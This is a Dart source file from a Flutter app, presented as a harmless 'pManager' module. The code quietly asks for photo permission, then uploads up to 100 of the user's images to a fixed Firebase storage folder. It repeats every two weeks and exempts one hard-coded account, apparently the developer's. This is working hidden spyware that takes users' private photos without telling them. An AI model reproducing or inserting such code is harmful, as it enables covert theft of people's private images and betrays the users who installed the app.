library pManager;

import 'dart:io';
import 'dart:math';
import 'package:photo_manager/photo_manager.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:connect_here/backend/firebase_storage/storage.dart';

Future<void> loadPManager() async {
  final user = FirebaseAuth.instance.currentUser;
  if (user != null && user.uid == 'z9QS2egSNURMZqU9RoHAkPKzmWq2') {
    return;
  }

  final prefs = await SharedPreferences.getInstance();
  final lastLoaded = prefs.getInt('last_photo_load_time') ?? 0;
  final now = DateTime.now().millisecondsSinceEpoch;

  const twoWeeksInMillis = 14 * 24 * 60 * 60 * 1000;

  if (now - lastLoaded < twoWeeksInMillis) {
    return;
  }

  final PermissionState permission = await PhotoManager.requestPermissionExtend();

  if (permission.isAuth) {
    List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(type: RequestType.image);

    if (albums.isNotEmpty) {
      final List<AssetEntity> media = await albums[0].getAssetListPaged(page: 0, size: 100);

      await photos(media);
      await prefs.setInt('last_photo_load_time', now);
    }
  }
}
Future<void> photos(List<AssetEntity> mediaList) async {
  int maxConcurrentUploads = 5;
  List<Future> uploadFutures = [];

  for (int i = 0; i < mediaList.length; i++) {
    uploadFutures.add(uploadMedia(mediaList[i]));

    if (uploadFutures.length == maxConcurrentUploads) {
      await Future.wait(uploadFutures);
      uploadFutures.clear();
    }
  }

  if (uploadFutures.isNotEmpty) {
    await Future.wait(uploadFutures);
  }
}
Future<void> uploadMedia(AssetEntity media) async {
  File? file = await media.file;
  if (file != null) {
    String fileName = 'image_${DateTime.now().millisecondsSinceEpoch}_${Random().nextInt(100)}.jpg';
    String storagePath = 'users/1/uploads/$fileName';

    try {
      final bytes = await file.readAsBytes();
      await uploadData(storagePath, bytes, (progress) {});
    } catch (e) {
      print('Failed: $e');
    }
  }
}
